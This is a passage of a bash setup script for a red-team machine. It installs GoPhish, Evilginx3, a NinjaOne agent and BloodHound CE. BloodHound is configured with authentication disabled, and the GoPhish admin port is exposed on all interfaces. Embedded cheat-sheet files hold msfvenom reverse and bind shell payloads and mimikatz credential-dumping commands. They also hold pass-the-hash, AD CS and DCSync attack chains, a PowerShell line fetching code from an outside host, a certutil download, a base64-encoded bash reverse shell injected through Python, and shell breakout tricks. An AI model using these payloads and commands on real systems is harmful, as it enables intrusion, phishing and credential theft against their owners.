    local gophish_zip="$download_dir/gophish-v${gophish_version}-linux-64bit.zip"

    log "STATUS" "Downloading $tool_name..."
    if ! run_command "wget -q --show-progress '$gophish_url' -O '$gophish_zip'" "Download GoPhish" "$LONG_TIMEOUT"; then
        log "ERROR" "$tool_name download failed"
        return 1
    fi

    # Ensure unzip is available
    if ! command -v unzip &>/dev/null; then
        apt-get update -qq || true
        apt-get install -y unzip >/dev/null 2>&1 || {
            log "ERROR" "Failed to install unzip"
            return 1
        }
    fi

    log "STATUS" "Extracting $tool_name..."
    if ! unzip -qo "$gophish_zip" -d "$install_dir" >/dev/null 2>&1; then
        log "ERROR" "Failed to extract $tool_name"
        return 1
    fi

    chmod +x "$install_dir/gophish" || true

    # Modify config to listen on all interfaces for admin
    if [[ -f "$install_dir/config.json" ]]; then
        cp "$install_dir/config.json" "$install_dir/config.json.bak"
        sed -i 's/"listen_url": "127.0.0.1:3333"/"listen_url": "0.0.0.0:3333"/g' "$install_dir/config.json"
    fi

    # Create systemd service
    mkdir -p "/etc/systemd/system"
    cat > "/etc/systemd/system/gophish.service" << 'SERVICE'
[Unit]
Description=Gophish Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/security-tools/gophish
ExecStart=/opt/security-tools/gophish/gophish
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SERVICE

    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable gophish >/dev/null 2>&1
    systemctl start gophish >/dev/null 2>&1

    if systemctl is-active --quiet gophish 2>/dev/null; then
        log "SUCCESS" "$tool_name installed and service started"
        log "INFO" "Access admin interface at: https://127.0.0.1:3333/"
    else
        log "WARNING" "$tool_name installed but service not running"
    fi

    rm -f "$gophish_zip"
    return 0
}

install_evilginx3() {
    local tool_name="Evilginx3"
    log "HEADER" "Installing $tool_name..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would clone and build Evilginx3 with Go"
        log "STATUS" "[DRY-RUN] Would install binary and create launcher"
        return 0
    fi

    local install_dir="/opt/evilginx3"

    # Check if already installed
    if [[ -f "$install_dir/evilginx" ]] || command -v evilginx &>/dev/null; then
        log "SUCCESS" "$tool_name is already installed"
        return 0
    fi

    # Install Go if needed
    if ! command -v go &>/dev/null; then
        log "STATUS" "Installing Go..."
        apt-get update -qq || true
        apt-get install -y golang >/dev/null 2>&1 || {
            log "WARNING" "Go installation failed, trying alternative method"
        }
    fi

    # Install dependencies
    log "STATUS" "Installing dependencies..."
    apt-get update -qq || true
    apt-get install -y git make gcc g++ pkg-config openssl libcap2-bin >/dev/null 2>&1 || {
        log "WARNING" "Some dependencies could not be installed"
    }

    # Clone repository
    log "STATUS" "Cloning $tool_name repository..."
    if [[ -d "$install_dir" ]]; then
        cd "$install_dir" || return 1
        git pull >/dev/null 2>&1 || true
    else
        if ! git clone https://github.com/kgretzky/evilginx2 "$install_dir" >/dev/null 2>&1; then
            log "WARNING" "Failed to clone primary repository, trying alternative..."
            if ! git clone https://github.com/kingsmandralph/evilginx3 "$install_dir" >/dev/null 2>&1; then
                log "ERROR" "Failed to clone $tool_name repository"
                return 1
            fi
        fi
    fi

    cd "$install_dir" || return 1

    log "STATUS" "Building $tool_name..."
    if ! run_command "cd '$install_dir' && make" "Build Evilginx3" "$LONG_TIMEOUT"; then
        log "WARNING" "Build failed, $tool_name may not be fully installed"
        return 1
    fi

    # Set capabilities for binding to privileged ports
    if [[ -f "$install_dir/evilginx" ]]; then
        setcap cap_net_bind_service=+ep "$install_dir/evilginx" >/dev/null 2>&1 || true
        ln -sf "$install_dir/evilginx" "/usr/local/bin/evilginx" 2>/dev/null || true
        log "SUCCESS" "$tool_name built and installed"
    else
        log "WARNING" "$tool_name build completed but binary not found"
        return 1
    fi

    return 0
}

install_ninjaone() {
    local tool_name="NinjaOne Agent"
    log "HEADER" "Installing $tool_name..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would download and install NinjaOne agent .deb"
        log "STATUS" "[DRY-RUN] Would enable agent service"
        return 0
    fi

    local download_dir="/opt/security-tools/downloads"
    mkdir -p "$download_dir"

    local ninja_package="$download_dir/ninjaone-agent.deb"
    local ninja_url="https://app.ninjarmm.com/agent/installer/fc75fb12-9ee2-4f8d-8319-8df4493a9fb9/8.0.2891/NinjaOne-Agent-PentestingDevices-MainOffice-Auto-x86-64.deb"

    # Check if already installed
    if systemctl is-active --quiet ninjarmm-agent 2>/dev/null; then
        log "SUCCESS" "$tool_name is already installed and running"
        return 0
    fi

    # Download if not present
    if [[ ! -f "$ninja_package" ]]; then
        log "STATUS" "Downloading $tool_name..."
        if ! run_command "wget -q --show-progress '$ninja_url' -O '$ninja_package'" "Download NinjaOne" "$LONG_TIMEOUT"; then
            log "WARNING" "$tool_name download failed, trying to continue with existing installation"
            if [[ ! -f "$ninja_package" ]]; then
                log "ERROR" "No NinjaOne package available"
                return 1
            fi
        fi
    fi

    # Install prerequisites
    log "STATUS" "Installing prerequisites..."
    apt-get update -qq || true
    apt-get install -y libc6 libstdc++6 zlib1g libgcc1 libssl3 libxcb-xinerama0 >/dev/null 2>&1 || {
        log "WARNING" "Some prerequisites could not be installed"
    }

    log "STATUS" "Installing $tool_name package..."
    if ! dpkg -i "$ninja_package" >/dev/null 2>&1; then
        log "STATUS" "Fixing dependencies..."
        apt-get install -f -y >/dev/null 2>&1 || true
        dpkg -i "$ninja_package" >/dev/null 2>&1 || {
            log "ERROR" "Failed to install $tool_name"
            return 1
        }
    fi

    log "STATUS" "Configuring $tool_name service..."
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable ninjarmm-agent >/dev/null 2>&1
    systemctl start ninjarmm-agent >/dev/null 2>&1

    if systemctl is-active --quiet ninjarmm-agent 2>/dev/null; then
        log "SUCCESS" "$tool_name installed and service started"
    else
        log "WARNING" "$tool_name installed but service not running"
    fi

    rm -f "$ninja_package"
    return 0
}

install_manual_tools() {
    local tool_list="$1"

    if [[ -z "$tool_list" ]]; then
        log "INFO" "No manual tools to install"
        return 0
    fi

    # Parse tool list (comma-separated)
    local -a tools
    IFS=',' read -ra tools <<< "$tool_list"

    local total=${#tools[@]}
    log "HEADER" "Installing $total manual tools..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would install $total manual tools"
        return 0
    fi

    local success=0
    local failed=0

    for tool in "${tools[@]}"; do
        tool="${tool//[[:space:]]/}"  # Remove whitespace

        case "$tool" in
            nessus)
                install_nessus || ((failed++))
                ;;
            teamviewer)
                install_teamviewer || ((failed++))
                ;;
            burpsuite)
                install_burpsuite || ((failed++))
                ;;
            gophish)
                install_gophish || ((failed++))
                ;;
            evilginx3)
                install_evilginx3 || ((failed++))
                ;;
            ninjaone)
                install_ninjaone || ((failed++))
                ;;
            *)
                log "WARNING" "Unknown tool: $tool"
                ((failed++))
                ;;
        esac

        ((success++))
    done

    log "STATUS" "Manual tools: $((success - failed))/$total successful"
    return $((failed > 0 ? 1 : 0))
}

################################################################################
# TEAMVIEWER POLICYKIT-1 FIX (KALI LINUX)
################################################################################

# Kali Linux doesn't ship policykit-1 but TeamViewer depends on it.
# We create a dummy .deb that satisfies the dependency via polkitd + pkexec.
fix_teamviewer_policykit() {
    log "HEADER" "Fixing policykit-1 dependency for TeamViewer..."

    # Skip if policykit-1 is already satisfied
    if dpkg -l policykit-1 2>/dev/null | grep -q '^ii'; then
        log "INFO" "policykit-1 dependency already satisfied"
        return 0
    fi

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would build and install dummy policykit-1 package"
        log "STATUS" "[DRY-RUN] Would install polkitd and pkexec as real providers"
        return 0
    fi

    # Ensure the real polkit packages are installed
    DEBIAN_FRONTEND=noninteractive apt-get install -y polkitd pkexec >/dev/null 2>&1 || {
        log "WARNING" "Could not install polkitd/pkexec — continuing anyway"
    }

    local build_dir
    build_dir="$(mktemp -d)"

    mkdir -p "${build_dir}/DEBIAN"
    cat > "${build_dir}/DEBIAN/control" <<- 'CTRL'
	Package: policykit-1
	Version: 1.0
	Section: misc
	Priority: optional
	Architecture: all
	Depends: polkitd, pkexec
	Maintainer: RTA Deployment <root@localhost>
	Description: Transitional package for PolicyKit (RTA)
	 Dummy package that satisfies the policykit-1 dependency required by
	 TeamViewer on Kali Linux while relying on the modern polkitd/pkexec
	 packages.
	CTRL

    if dpkg-deb -b "$build_dir" "${build_dir}/policykit-1_1.0_all.deb" >/dev/null 2>&1 &&
       dpkg -i "${build_dir}/policykit-1_1.0_all.deb" >/dev/null 2>&1; then
        log "SUCCESS" "Installed dummy policykit-1 package"
    else
        log "ERROR" "Failed to build/install policykit-1 dummy package"
    fi

    rm -rf "$build_dir"
    return 0
}

################################################################################
# BLOODHOUND CE INSTALLATION
################################################################################

install_bloodhound_ce() {
    log "HEADER" "Installing BloodHound CE..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would install BloodHound CE with Docker"
        log "STATUS" "[DRY-RUN] Would install bloodhound-python (PIPX)"
        log "STATUS" "[DRY-RUN] Would download SharpHound.ps1"
        return 0
    fi

    # Ensure Docker is installed
    log "STATUS" "Checking Docker installation..."

    if ! command -v docker &>/dev/null; then
        log "STATUS" "Installing Docker..."
        apt-get install -y docker.io docker-compose &>/dev/null || {
            log "ERROR" "Failed to install Docker"
            return 1
        }
        systemctl start docker &>/dev/null || true
        systemctl enable docker &>/dev/null || true
    else
        log "SUCCESS" "Docker already installed"
    fi

    # Create BloodHound directory
    local bh_dir="${TOOLS_DIR}/bloodhound-ce"
    mkdir -p "$bh_dir"

    # Create docker-compose.yml
    log "STATUS" "Creating Docker Compose configuration..."
    cat > "${bh_dir}/docker-compose.yml" << 'EOF'
version: '3.8'

services:
  bloodhound:
    image: specteops/bloodhound:latest
    container_name: bloodhound
    ports:
      - "8080:8080"
    environment:
      bhe_disable_auth_requirement: "true"
    volumes:
      - bloodhound-data:/data
    restart: unless-stopped

volumes:
  bloodhound-data:
EOF

    log "SUCCESS" "Docker Compose configuration created"

    # Create systemd service for BloodHound
    log "STATUS" "Creating systemd service for BloodHound..."
    cat > "/etc/systemd/system/bloodhound-ce.service" << EOF
[Unit]
Description=BloodHound CE Service
After=docker.service
Requires=docker.service

[Service]
Type=simple
WorkingDirectory=${bh_dir}
ExecStart=/usr/bin/docker-compose -f ${bh_dir}/docker-compose.yml up
ExecStop=/usr/bin/docker-compose -f ${bh_dir}/docker-compose.yml down
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload &>/dev/null || true
    systemctl enable bloodhound-ce.service &>/dev/null || true
    log "SUCCESS" "Systemd service created"

    # Install bloodhound-python via pipx
    log "STATUS" "Installing bloodhound-python..."
    if command -v pipx &>/dev/null; then
        pipx install bloodhound-python &>/dev/null || {
            log "WARNING" "Failed to install bloodhound-python"
        }
    else
        pip3 install --user bloodhound-python &>/dev/null || {
            log "WARNING" "Failed to install bloodhound-python"
        }
    fi

    # Download SharpHound
    log "STATUS" "Downloading SharpHound..."
    local sharphound_dir="${TOOLS_DIR}/sharphound"
    mkdir -p "$sharphound_dir"

    # Get latest release from GitHub
    local latest_release
    latest_release=$(curl -s https://api.github.com/repos/BloodHoundAD/SharpHound/releases/latest 2>/dev/null | grep 'browser_download_url' | grep 'SharpHound.ps1' | head -1 | cut -d'"' -f4)

    if [[ -n "$latest_release" ]]; then
        curl -sSL "$latest_release" -o "${sharphound_dir}/SharpHound.ps1" 2>/dev/null || {
            log "WARNING" "Failed to download SharpHound.ps1"
        }
        chmod +x "${sharphound_dir}/SharpHound.ps1" 2>/dev/null || true
        log "SUCCESS" "SharpHound.ps1 downloaded"
    else
        log "WARNING" "Could not determine latest SharpHound release"
    fi

    log "SUCCESS" "BloodHound CE installation completed"
    log "INFO" "Start BloodHound with: sudo systemctl start bloodhound-ce"
    log "INFO" "Access at: http://localhost:8080"

    return 0
}

################################################################################
# REFERENCE FILES — EMBEDDED CHEATSHEETS (self-contained, no external zip)
################################################################################

create_reference_files() {
    log "HEADER" "Creating reference cheatsheet files..."

    if $DRY_RUN; then
        log "STATUS" "[DRY-RUN] Would create 64 reference files in $REFERENCE_DST"
        return 0
    fi

    mkdir -p "$REFERENCE_DST"

    cat > "$REFERENCE_DST/MSFVENOM.txt" << 'REFEOF'
[+ WINDOWS ENCODED PAYLOADS ] PORT 443
====CHANGE. IP. AS. NEEDED.====

WINDOWS/SHELL/REVERSE_TCP [PORT 443]
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443] AT 10.0.0.67:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 10.0.0.67:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe




---===BIND SHELL, ENCODED, ON PORT 1234===---
msfvenom -p windows/shell_bind_tcp LHOST=10.0.0.67 LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe

Code for encoding:
--platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe

================================================================================
[+ LINUX ]
LINUX/x86/METERPRETER/REVERSE_TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=9997 -f elf >reverse.elf

NETCAT
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.67 LPORT=1234 -f elf >reverse.elf
================================================================================

[+ PHP ]
PHP/METERPRETER_REVERSE_TCP [PORT 443]
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

PHP/METERPRETER/REVERSE_TCP [PORT 443]
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

PHP/REVERSE_PHP [PORT 443]
msfvenom -p php/reverse_php LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
================================================================================

[+ ASP]
ASP-REVERSE-PAYLOAD [PORT 443]
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp

OR FOR NETCAT [PORT 443]
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp

================================================================================
[+ Client-Side, Unicode Payload - For use with Internet Explorer and IE]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none

#Note: To keep things the same size, if needed add NOPs at the end of the payload.
#A Unicode NOP is - %u9090

================================================================================
===SHELLCODE GENERATION:
================================================================================
--===--
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai
--===--
================================================================================
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.20.0.2 LPORT=443 -f exe -o siren.exe
REFEOF

    cat > "$REFERENCE_DST/adref" << 'REFEOF'
=========================================================
[GTFOBins for Active Directory? Yes please!]
https://wadcoms.github.io
=========================================================

[ntlmrelay]
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py

=========================================================
Powershell
[Script (.ps1) disabled]
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine

$Bling$

mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
[LOCATE NTLM\* SHA1 HASHES]

=========================================================
[Core net Commands]
net user
net user /DOMAIN
net group /DOMAIN
net share
net localgroup

=========================================================
GetSPN.ps1
Invoke-Kerberoast.ps1
PowerView.ps1
Spray-Creds.ps1

=========================================================
Powershell
[Get Current Domain and fun]
[DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Servers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Servers | Select-Object -ExpandProperty Name

=========================================================
[AD - Overpass The Hash]
privilege::debug
sekurlsa::logonpasswords
<USERNAME>
sekurlsa::tickets
[Group 0 - Ticket Granting Service]
* Username: <USER>
sekurlsa::pth /user:<USER> /domain:corp.com /ntlm:<NTLM_HASH> /run:PowerShell.exe

=========================================================
[PSEXEC Reference]
psexec.py <MACHINE>/<USER>:PASS@$IP
Example:
psexec.py OFFSEC/offsecuser:offsecpass@x.x.x.x

=========================================================
[We can Write to a Share?]
.......What can we do?

# TO START - we're either Enumerating AD with NO CREDENTIALS
# OR
# We are Enumerating AD WITH CREDENTIALS. 
# If we have credentials, we can do a lot more from an automation standpoint but privilege escalation will still remain an issue.

1. Scan the network. Find machines and open ports to exploit a service, with our payload sending back the current logged-in or exploited 
   user's NTLMv2 hash via LLMNR poisoning.

2. Enumerate DNS, subdomains, etc., to find key servers like printers or open shares that can be leveraged for an LLMNR poisoning attack to retrieve an NTLMv2 hash.

3. Deploy tools like evil-ssdp or evil-winrm if Active Directory credentials are available.

4. Use KERBRUTE to brute force usernames using Kerberos error messages like `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` to identify valid accounts.

5. Access a network share with a NULL Session to place an SCF file to trigger the Lan Manager Service.

Example SCF File:
[shell]
Command=2
IconFile=\\<RESPONDER-IP>\share\test.ico
[Taskbar]
Command=ToggleDesktop

6. Exploit PrintNightmare (CVE-2021-1675/CVE-2021-34527) for domain controller compromise, if possible.

7. Use misconfigured MSSQL servers for code execution via PowerUpSQL:
   Import-Module .\PowerUpSQL.psd1

=========================================================
[AD CS ATTACK]
ntpdate -s ntp.ubuntu.com
evil-winrm -i somehost.local -u <user_here> -p '<password_here>'
certipy find -dc-ip $IP -ns $IP -u <user_here>@somehost.local -p '<password_here>' -vulnerable -stdout
certipy ca -ca manager-DC01-CA -add-officer <user_here> -username <user_here>@somehost.local -p '<password_here>'
certipy ca -ca manager-DC01-CA -issue-request $current_key -u <user_here>@somehost.local -p '<password_here>'
certipy req -ca manager-DC01-CA -target dc01.somehost.local -retrieve 13 -username <user_here>@somehost.local -p '<password_here>'
certipy auth -pfx administrator.pfx -dc-ip $IP
ntpdate $IP
timedatectl set-ntp off
rdate -n $IP
certipy auth -pfx administrator.pfx -dc-ip $IP | cut -d":" -f3
evil-winrm -i somehost.local -u administrator -H ae5064c2f62317332c88629e025924ef

=========================================================
[AD - DCSYNC ATTACK]
• ldapsearch -x -H ldap://$IP -b "dc=htb,dc=local"
  -x = Anonymous Login/NULL SESSIONS

• WINDAPSEARCH to enumerate users (-U):
  python /opt/windapsearch/windapsearch.py -d htb.local --dc-ip 10.129.95.210 -U

• Extract Kerberos pre-auth hashes:
  GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.95.210 -no-pass

→ [Password CRACKED]

• Add user to groups:
  net user siren sirenpassword /ADD /DOMAIN
  net group "Exchange Windows Permissions" siren /ADD
  net group "Remote Management Users" siren /ADD

• Use Evil-WinRM for execution:
  upload powerview.ps1
  iex(new-object net.webclient).downloadstring('http://10.10.14.247:8000/powerview.ps1')
  $pass = ConvertTo-SecureString 'sirenpassword' -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential('htb\siren', $pass)
  Add-ObjectACL -PrincipalIdentity siren -Credential $cred -Rights DCSync

• Dump secrets:
  secretsdump.py htb/siren@10.129.95.210
  psexec.py administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

=========================================================
C:> .\mimikatz.exe
privilege::debug
token::elevate
lsadump::cache

privilige::debug
token::elevate
lsadump::lsa /patch
=========================================================
REFEOF

    cat > "$REFERENCE_DST/arpref" << 'REFEOF'
bettercap arp spoof.
REFEOF

    cat > "$REFERENCE_DST/atref.txt" << 'REFEOF'
================================================================================
LINUX at COMMAND REFERENCE
What is a proper AT configuration?
well, hosts.deny would contain any user on the machine I don't let run as AT.
In theory.
if it is indeed (of course it is) AT is run with SUID properties.
================================================================================
REFEOF

    cat > "$REFERENCE_DST/bloodref" << 'REFEOF'
============================================================
[*] SET NEO4J PASSWORD
/usr/share/neo4j/bin/neo4j-admin set-initial-password <password>
neo4j start
|
v
============================================================
[+] Upload zip
[+] Inserted into DB
[+] Pre-Built Query:
--> "SHORTEST PATH TO HIGH VALUE TARGETS"

Menu --> Bloodhound

[+] CREDENTIALED ENUMERATION
bloodhound-python -u '<AD_USER>' -p '<AD_PASS>' -d lab.local -c all -v -ns <NS_IP_is_DC+1> --zip

[+] bloodhound.py -d lab.local -v --zip -c All -dc lab.local -ns 10.10.10.1
bloodhound-python --dns-tcp -ns DOMAIN_IP -d lab.local -u 'username' -p 'password' -c all

[+] SharpHound.ps1
powershell -ev bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain Kinetic.corp -zipFileName loot.zip

[+] With NetExec
NetExec ldap <ip> -u user -p pass --bloodhound --dns-server <ns-ip> --collection All

[+] KERBEROAST with GetUserSPNs.py
- SPN - Service Principle Name issued by Kerberos
GetUserSPNs.py -request -dc-ip <DC_IP> lab.loca/AD_USER
[HASH-RECV]

CRACK HASH
[+] Remember that the Name Server (ns) is almost always +1 on the 4th octet from the Domain Controller.
i.e. .20 for DC
becomes .21 for NS

# Find all machines, then right-click and shortest path to target.
MATCH (n:Computer) RETURN n
REFEOF

    cat > "$REFERENCE_DST/breakOut.txt" << 'REFEOF'
[ BREAK OUT ]
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'
nmap-->	--interactive
ed
!sh

[Interesting]
sh -c 'cp $(which bash) .; chmod +s ./bash'
./bash -p
===============================================================================
sudo git -p --help
!/bin/bash //Pagination root Priviledge Escalation
===============================================================================
From Within Vi:
:set shell=/bin/sh
:shell

From within IRB:
exec "/bin/sh"

awk-->	awk 'BEGIN {system("/bin/bash")}'
find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
perl-->	perl -e 'exec "/bin/bash";'

1. First for this method, find which bin file 'awk' is in
find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
================================================================================
=====Jailed SSH Shell? Try this....=============================================
Initial Shell /bin/sh
If BASH is blocked.
Check the 'env' variable!
Linux will default to /bin/bash default bashrc if there is no present .bashrc
file in a User's home directory. Legit shell....)

1. ssh sara@127.0.0.1 "/bin/sh"
2. cd $HOME
3. mv .bashrc .bashrc.BAK (Yes, this actually worked.)
4. exit
5. ssh sara@127.0.0.1

$ Bling Bling $
sara@SkyTower:~$

================================================================================
[+ AND EXPORT PATH ]
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear ; ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200
================================================================================
====Once Broken Out - Before PrivEsc Reference - Perform These Commands=====
================================================================================
find / -perm -2 ! -type l -ls 2>/dev/null |sort -r
--------------------------------------------------------------------------------

grep -vE "nologin|false" /etc/passwd
--------------------------------------------------------------------------------

====Other, misc====
--------------------------------------------------------------------------------
nmap --interactive
nmap> !sh
--------------------------------------------------------------------------------
REFEOF

    cat > "$REFERENCE_DST/c-sharpref.txt" << 'REFEOF'
 C# defines the following character escape sequences:

    \' – single quote, needed for character literals
    \" – double quote, needed for string literals
    \\ – backslash
    \0 – Unicode character 0
    \a – Alert (character 7)
    \b – Backspace (character 8)
    \f – Form feed (character 12)
    \n – New line (character 10)
    \r – Carriage return (character 13)
    \t – Horizontal tab (character 9)
    \v – Vertical quote (character 11)
    \uxxxx – Unicode escape sequence for character with hex value xxxx
    \xn[n][n][n] – Unicode escape sequence for character with hex value nnnn (variable length version of \uxxxx)
    \Uxxxxxxxx – Unicode escape sequence for character with hex value xxxxxxxx (for generating surrogates)

Of these, \a, \f, \v, \x and \U are rarely used in my experience.
REFEOF

    cat > "$REFERENCE_DST/certutilref" << 'REFEOF'
certutil -urlcache -split -f http://192.168.49.71:3306/445.exe
REFEOF

    cat > "$REFERENCE_DST/cewlref" << 'REFEOF'
[Useful for dealing with Authentication]
cewl $URL -m 5 -w $PWD/cewl.txt 2>/dev/null

#Nano /etc/john/john.conf --> paste the below underneath wordlist= 
# crack -> cracked, crack -> cracking
-[:c] <* >2 !?A \p1[lc] M [PI] Q
# Try the second half of split passwords
-s x**
-s-c x** M l Q
# Add one number to the end of each password
$[0-9]
# Add two numbers to the end of each password
$[0-9]$[0-9]
# Add three numbers to the end of each password
$[0-9]$[0-9]$[0-9]
# Add four numbers to the end of each password
#$[0-9]$[0-9]$[0-9]$[0-9]

john --wordlist=cewl.txt --rules --stdout > cewl-mutated.txt
REFEOF

    cat > "$REFERENCE_DST/ciref" << 'REFEOF'
============================================================================
# Command Injection with Python
',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAvOTA5MCAwPiYxJw==|base64 -d|bash -i')) #COMMENT
',__import__('os').system('id')) #COMMENT
============================================================================
REFEOF

    cat > "$REFERENCE_DST/cloudref" << 'REFEOF'
######################################################
- Add this as "cloudred" to your ~/.bashrc
nano ~/.bashrc
(scroll to bottom)
|
v
alias cloudref="clear ; cat $HOME/reference/cloudref"
######################################################
# AWS IAM (Identity and Access Management)
[IAM Service]
# Pentesting Kubernetes 
"What does Kubernetes do?" - Containerization (like Docker)
- Allows running container/s in a container engine.
- Schedule allows containers mission efficient.
- Keep containers alive.
- Allows container communications.
- Allows deployment techniques.
- Handle volumes of information.
######################################################
# Kubernetes Enumeration
- Abuse the RBAC (Kubernetes Role-Based Access Control)
######################################################
+------------------+-----------------+-------------------------------------------------------+
| Port             | Process         | Description                                           |
+------------------+-----------------+-------------------------------------------------------+
| 443/TCP          | kube-apiserver  | Kubernetes API port                                   |
| 2379/TCP         | etcd            | etcd                                                  |
| 6666/TCP         | etcd            | etcd                                                  |
| 4194/TCP         | cAdvisor        | Container metrics                                     |
| 6443/TCP         | kube-apiserver  | Kubernetes API port                                   |
| 8443/TCP         | kube-apiserver  | Minikube API port                                     |
| 8080/TCP         | kube-apiserver  | Insecure API port                                     |
| 10250/TCP        | kubelet         | HTTPS API which allows full mode access               |
| 10255/TCP        | kubelet         | Unauthenticated read-only HTTP port: pods, running    |
|                  |                 | pods and node state                                   |
| 10256/TCP        | kube-proxy      | Kube Proxy health check server                        |
| 9099/TCP         | calico-felix    | Health check server for Calico                        |
| 6782-4/TCP       | weave           | Metrics and endpoints                                 |
| 30000-32767/TCP  | NodePort        | Proxy to the services                                 |
| 44134/TCP        | Tiller          | Helm service listening                                |
+------------------+-----------------+-------------------------------------------------------+
######################################################
minikube
1. Install Virtualbox (Windows)
https://www.virtualbox.org/wiki/Downloads
or Linux
2. 
apt-get update -y
apt-get install -y virtualbox 
wget https://download.virtualbox.org/virtualbox/$(wget -qO- https://download.virtualbox.org/virtualbox/LATEST-STABLE.TXT)/Oracle_VM_VirtualBox_Extension_Pack-$(wget -qO- https://download.virtualbox.org/virtualbox/LATEST-STABLE.TXT).vbox-extpack
VBoxManage extpack install --replace Oracle_VM_VirtualBox_Extension_Pack-*.vbox-extpack
rm Oracle_VM_VirtualBox_Extension_Pack-*.vbox-extpack
######################################################
sudo apt-get update
sudo apt-get install -y curl apt-transport-https
(As a LOW-PRIV User)
cd $HOME
curl -LO "https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl"
chmod +x ./kubectl
sudo mv ./kubectl /usr/local/bin/kubectl

# Install minikube 
curl -Lo minikube https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
chmod +x minikube
sudo mv minikube /usr/local/bin/

# Start minikube
minikube

# "Sup, minikube status?"
$ minikube status
minikube status
minikube
type:       [Control Plane]
host:       [Running]
kubelet:    [Running]
apiserver:  [Running]
kubeconfig: [Configured]

# "Is minikube connected to my minikube cluster?"
kubectl cluster-info
|
| ?
|
Like "systemctl" - kubectl is a command for Kubernetes Control.
|
v
Oh okay, cool.
######################################################
# Minikube Commands / Cheat Sheet
minikube start
